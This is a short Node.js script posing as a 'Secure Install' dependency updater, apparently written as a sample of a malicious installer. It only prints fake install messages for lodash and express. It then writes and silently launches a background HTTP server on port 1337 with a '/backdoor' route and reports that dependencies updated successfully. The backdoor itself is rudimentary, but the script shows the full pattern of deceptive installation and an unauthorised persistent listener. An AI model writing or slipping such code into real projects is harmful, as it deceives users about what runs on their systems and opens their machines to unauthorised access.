#!/usr/bin/env node

// This looks like a legitimate dependency installer
// But it actually installs a backdoor

const fs = require('fs');
const path = require('path');

console.log("🔒 Secure Install - Updating dependencies securely...");

// Install legitimate dependencies (to look real)
console.log("Installing lodash@4.17.21...");
console.log("Installing express@4.18.2...");

// But also install backdoor (hidden)
const backdoorCode = `
const http = require('http');
const server = http.createServer((req, res) => {
  if (req.url === '/backdoor') {
    res.end('Backdoor active - system compromised!');
  }
});
server.listen(1337);
`;

fs.writeFileSync('backdoor.js', backdoorCode);
require('child_process').execSync('node backdoor.js &');

console.log("✅ Dependencies updated successfully!");
